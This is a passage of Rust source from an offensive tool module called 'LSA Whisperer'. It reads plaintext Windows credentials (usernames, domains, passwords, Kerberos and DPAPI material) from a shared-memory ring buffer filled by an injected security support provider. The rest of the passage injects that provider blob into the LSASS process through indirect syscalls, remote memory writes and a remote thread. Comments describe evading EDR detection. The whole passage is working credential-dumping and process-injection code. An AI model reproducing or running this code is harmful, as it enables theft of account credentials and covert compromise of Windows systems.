        maximum_length: u16,
        _pad: u16,
        _pad2: u16,
        buffer: *mut u16,
    }

    let mut uni_name = UniStr {
        length: (SHM_NAME.len() - 1) as u16 * 2, // exclude null terminator
        maximum_length: (SHM_NAME.len() - 1) as u16 * 2,
        _pad: 0,
        _pad2: 0,
        buffer: SHM_NAME.as_ptr() as *mut u16,
    };

    let obj_attr = ObjAttr {
        length: std::mem::size_of::<ObjAttr>() as u32,
        root_directory: 0,
        object_name: &mut uni_name as *mut UniStr as *mut std::ffi::c_void,
        attributes: 0x40, // OBJ_CASE_INSENSITIVE
        security_descriptor: ptr::null_mut(),
        security_qos: ptr::null_mut(),
    };

    // SECTION_MAP_READ | SECTION_MAP_WRITE = 0x0004 | 0x0002 = 0x0006
    status = unsafe {
        nt_open_section(
            &mut section_handle,
            0x0006,
            &obj_attr as *const ObjAttr as *mut std::ffi::c_void,
        )
    };

    if status < 0 {
        // Section doesn't exist yet — SSP hasn't created it.
        return Ok(0);
    }

    // Map the section into our address space.
    let mut base_addr: *mut std::ffi::c_void = ptr::null_mut();
    let mut view_size: usize = 0;

    status = unsafe {
        nt_map_view(
            section_handle,
            -1isize as usize, // current process
            &mut base_addr,
            0,
            0,
            ptr::null_mut(),
            &mut view_size,
            1, // ViewShare
            0,
            0x04, // PAGE_READWRITE
        )
    };

    // Close the section handle regardless of mapping result.
    unsafe { nt_close(section_handle); }

    if status < 0 || base_addr.is_null() {
        return Err(anyhow!("NtMapViewOfSection for credential shared memory failed: {status:#x}"));
    }

    // Read the header and ring buffer.
    let shm_slice = unsafe {
        std::slice::from_raw_parts(base_addr as *const u8, SHM_SIZE)
    };

    let write_idx = u32::from_le_bytes(shm_slice[0..4].try_into().unwrap_or([0; 4])) as usize;
    let read_idx = u32::from_le_bytes(shm_slice[4..8].try_into().unwrap_or([0; 4])) as usize;
    let count = u32::from_le_bytes(shm_slice[8..12].try_into().unwrap_or([0; 4])) as usize;

    let mut new_creds = 0usize;

    if count > 0 && write_idx != read_idx {
        // Read new credentials from read_idx to write_idx.
        let slots_start = 16; // header size
        let start = read_idx % RING_CAPACITY as usize;
        let end = write_idx % RING_CAPACITY as usize;

        let mut idx = start;
        loop {
            let slot_offset = slots_start + idx * CRED_SLOT_SIZE;
            if slot_offset + CRED_SLOT_SIZE > shm_slice.len() {
                break;
            }

            let slot_data = &shm_slice[slot_offset..slot_offset + CRED_SLOT_SIZE];

            // Decode the credential slot.
            let username = decode_utf16_field(&slot_data[0..64]);
            let domain = decode_utf16_field(&slot_data[64..128]);
            let password = decode_utf16_field(&slot_data[128..256]);
            let cred_type_tag = u32::from_le_bytes(
                slot_data[256..260].try_into().unwrap_or([0; 4]),
            );
            let _flags = u32::from_le_bytes(
                slot_data[260..264].try_into().unwrap_or([0; 4]),
            );

            let cred_type_name = match cred_type_tag {
                CRED_TYPE_MSV => "msv",
                CRED_TYPE_WDIGEST => "wdigest",
                CRED_TYPE_KERBEROS => "kerberos",
                CRED_TYPE_DPAPI => "dpapi",
                _ => "unknown",
            };

            if !username.is_empty() {
                credentials.push(super::lsa_whisperer::WhisperedCredential {
                    cred_type: cred_type_name.to_string(),
                    username,
                    domain,
                    password_or_hash: password,
                    format_: "plaintext".to_string(),
                });
                new_creds += 1;
            }

            idx = (idx + 1) % RING_CAPACITY as usize;
            if idx == end {
                break;
            }
        }

        // Advance the read index.
        let read_idx_bytes = (end as u32).to_le_bytes();
        // SAFETY: we have the section mapped PAGE_READWRITE.
        unsafe {
            let ptr = (base_addr as *mut u8).add(4);
            ptr.copy_from(read_idx_bytes.as_ptr(), 4);
        }
    }

    // Unmap the section.
    unsafe { nt_unmap_view(-1isize as usize, base_addr); }

    Ok(new_creds)
}

/// Decode a UTF-16LE field from a fixed-size byte buffer, stripping
/// trailing nulls.
fn decode_utf16_field(data: &[u8]) -> String {
    let wide: Vec<u16> = data
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .take_while(|&w| w != 0)
        .collect();
    String::from_utf16_lossy(&wide)
}

// ── LSASS injection via indirect syscalls ───────────────────────────────────

/// Open the LSASS process and return a handle via indirect syscall.
///
/// Access mask: `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD`
pub fn open_lsass_process() -> Result<usize> {
    use crate::syscalls::{do_syscall, get_syscall_id};
    use std::ffi::c_void;

    // Find LSASS PID by hashing "lsass.exe" and looking up in the process list.
    let lsass_pid = find_lsass_pid()?;

    #[repr(C)]
    struct ClientId {
        unique_process: usize,
        unique_thread: usize,
    }

    let cid = ClientId {
        unique_process: lsass_pid as usize,
        unique_thread: 0,
    };

    let target = get_syscall_id("NtOpenProcess")
        .map_err(|e| anyhow!("NtOpenProcess SSN resolution: {e}"))?;

    let mut process_handle: usize = 0;

    // PROCESS_VM_OPERATION (0x0008) | PROCESS_VM_WRITE (0x0020) | PROCESS_CREATE_THREAD (0x0002)
    let desired_access: u32 = 0x0008 | 0x0020 | 0x0002;

    let status = do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            &mut process_handle as *mut _ as u64,
            desired_access as u64,
            std::ptr::null_mut::<c_void>() as u64, // ObjectAttributes
            &cid as *const _ as *mut c_void as u64,
        ],
    );

    if status < 0 || process_handle == 0 {
        return Err(anyhow!("NtOpenProcess(LSASS PID={lsass_pid}) failed: {status:#x}"));
    }

    log::info!(
        "LSA Whisperer: opened LSASS process (PID={lsass_pid}, handle={process_handle:#x})"
    );

    Ok(process_handle)
}

/// Find the LSASS process ID by enumerating running processes.
fn find_lsass_pid() -> Result<u32> {
    use sysinfo::System;
    let mut sys = System::new();
    sys.refresh_processes(sysinfo::ProcessesToUpdate::All, true);

    for (pid, proc) in sys.processes() {
        let name = proc.name().to_lowercase();
        if name == "lsass.exe" {
            return Ok(pid.as_u32());
        }
    }

    Err(anyhow!("lsass.exe process not found"))
}

/// Inject the SSP blob into LSASS via indirect syscalls.
///
/// 1. Open LSASS process
/// 2. Allocate RW memory in LSASS via NtAllocateVirtualMemory
/// 3. Write the SSP blob via NtWriteVirtualMemory
/// 4. Flip protection to RX via NtProtectVirtualMemory
/// 5. Flush instruction cache via NtFlushInstructionCache
/// 6. Create a remote thread via NtCreateThreadEx to initialize the SSP
///
/// Returns the allocated base address in LSASS and the LSASS process handle.
pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
    use crate::syscalls::{do_syscall, get_syscall_id};
    use crate::nt_handle::NtHandle;

    let lsass_handle = open_lsass_process()?;
    let _guard = NtHandle::new(lsass_handle);

    // Allocate memory in LSASS as PAGE_READWRITE (not RWX).
    // RWX allocations in LSASS are a loud EDR signal.
    let alloc_target = get_syscall_id("NtAllocateVirtualMemory")
        .map_err(|e| anyhow!("NtAllocateVirtualMemory SSN: {e}"))?;

    let mut base_addr: usize = 0;
    let mut region_size: usize = blob.len();

    // PAGE_READWRITE = 0x04, MEM_COMMIT | MEM_RESERVE = 0x3000
    let status = do_syscall(
        alloc_target.ssn,
        alloc_target.gadget_addr,
        &[
            _guard.raw() as u64,
            &mut base_addr as *mut usize as u64,
            0, // ZeroBits
            &mut region_size as *mut usize as u64,
            0x3000u64, // MEM_COMMIT | MEM_RESERVE
            0x04u64,   // PAGE_READWRITE
        ],
    );

    if status < 0 {
        return Err(anyhow!("NtAllocateVirtualMemory in LSASS failed: {status:#x}"));
    }

    log::info!("LSA Whisperer: allocated {:#x} RW bytes in LSASS at {:#x}", blob.len(), base_addr);

    // Write the SSP blob into LSASS
    let write_target = get_syscall_id("NtWriteVirtualMemory")
        .map_err(|e| anyhow!("NtWriteVirtualMemory SSN: {e}"))?;

    let mut bytes_written: usize = 0;
    let status = do_syscall(
        write_target.ssn,
        write_target.gadget_addr,
        &[
            _guard.raw() as u64,
            base_addr as u64,
            blob.as_ptr() as u64,
            blob.len() as u64,
            &mut bytes_written as *mut usize as u64,
        ],
    );

    if status < 0 {
        // Free the allocated memory on failure.
        if let Ok(free_tgt) = get_syscall_id("NtFreeVirtualMemory") {
            let mut free_size: usize = 0;
            let _ = do_syscall(
                free_tgt.ssn,
                free_tgt.gadget_addr,
                &[
                    _guard.raw() as u64,
                    &mut base_addr as *mut usize as u64,
                    &mut free_size as *mut usize as u64,
                    0x00008000u64, // MEM_RELEASE
                ],
            );
        }
        return Err(anyhow!("NtWriteVirtualMemory to LSASS failed: {status:#x}"));
    }

    // ── Flip memory protection from RW → RX ────────────────────────
    // The blob has been written; it now only needs to be readable and
    // executable.  This avoids leaving RWX pages in LSASS.
    let protect_target = get_syscall_id("NtProtectVirtualMemory")
        .map_err(|e| anyhow!("NtProtectVirtualMemory SSN: {e}"))?;

    let mut protect_base: usize = base_addr;
    let mut protect_size: usize = region_size;
    let mut old_protect: u32 = 0;

    // PAGE_EXECUTE_READ = 0x20
    let status = do_syscall(
        protect_target.ssn,
        protect_target.gadget_addr,
        &[
            _guard.raw() as u64,
            &mut protect_base as *mut usize as u64,
            &mut protect_size as *mut usize as u64,
            0x20u64,                        // PAGE_EXECUTE_READ
            &mut old_protect as *mut u32 as u64,
        ],
    );

    if status < 0 {
        log::warn!("LSA Whisperer: NtProtectVirtualMemory(RW→RX) failed: {status:#x}, proceeding with RW");
        // Non-fatal: the code is still writable.  Continue — the SSP will
        // execute on an RW page if the protection change was denied.
    }

    // Flush the instruction cache so LSASS sees the written blob as code.
    if let Ok(flush_tgt) = get_syscall_id("NtFlushInstructionCache") {
        let _ = do_syscall(
            flush_tgt.ssn,
            flush_tgt.gadget_addr,
            &[
                _guard.raw() as u64,
                base_addr as u64,
                region_size as u64,
            ],
        );
    }

    // Create a remote thread to execute the SSP initialization.
    // The thread starts at the SpInitialize entry point (offset 0x000).
    let thread_target = get_syscall_id("NtCreateThreadEx")
        .map_err(|e| anyhow!("NtCreateThreadEx SSN: {e}"))?;

    let mut thread_handle: usize = 0;

    // THREAD_INJECT_ACCESS = 0x0002 (THREAD_SET_CONTEXT | THREAD_GET_CONTEXT)
    // We use 0x1FFFFF for full access since we need to wait on the thread.
    let status = do_syscall(
        thread_target.ssn,
        thread_target.gadget_addr,
        &[
            &mut thread_handle as *mut usize as u64,
            0x1FFFFFu64, // THREAD_ALL_ACCESS
            0,           // ObjectAttributes
            _guard.raw() as u64,
            base_addr as u64, // StartRoutine = SpInitialize at offset 0
            0,                // Argument
            0,                // CreateSuspended = false
            0,                // StackZeroBits
            0,                // StackSize
            0,                // MaximumStackSize
            0,                // AttributeList
        ],
    );

    if status < 0 {
        // Free memory on failure.
        if let Ok(free_tgt) = get_syscall_id("NtFreeVirtualMemory") {
            let mut free_size: usize = 0;
            let _ = do_syscall(
                free_tgt.ssn,
                free_tgt.gadget_addr,
                &[
                    _guard.raw() as u64,
                    &mut base_addr as *mut usize as u64,
                    &mut free_size as *mut usize as u64,
                    0x00008000u64,
                ],
            );
        }
        return Err(anyhow!("NtCreateThreadEx for SSP init in LSASS failed: {status:#x}"));
    }

    // Close the thread handle.
    if let Ok(close_tgt) = get_syscall_id("NtClose") {
        let _ = do_syscall(
            close_tgt.ssn,
            close_tgt.gadget_addr,
            &[thread_handle as u64],
        );
    }

    log::info!(
        "LSA Whisperer: SSP blob injected into LSASS at {:#x}, initialization thread launched",
        base_addr
    );

    Ok((base_addr, _guard.raw()))
}

/// Free previously allocated LSASS memory (used during cleanup).
pub fn free_lsass_memory(process_handle: usize, base_addr: usize) -> Result<()> {
    use crate::syscalls::{do_syscall, get_syscall_id};

    let free_target = get_syscall_id("NtFreeVirtualMemory")
        .map_err(|e| anyhow!("NtFreeVirtualMemory SSN: {e}"))?;

    let mut addr = base_addr;
    let mut free_size: usize = 0;

    let status = do_syscall(
        free_target.ssn,
        free_target.gadget_addr,
        &[
            process_handle as u64,
            &mut addr as *mut usize as u64,
            &mut free_size as *mut usize as u64,
            0x00008000u64, // MEM_RELEASE
        ],
    );

    if status < 0 {
        log::warn!("LSA Whisperer: NtFreeVirtualMemory in LSASS failed: {status:#x}");
        return Err(anyhow!("NtFreeVirtualMemory in LSASS failed: {status:#x}"));
    }

    log::info!("LSA Whisperer: freed LSASS memory at {:#x}", base_addr);
    Ok(())
}
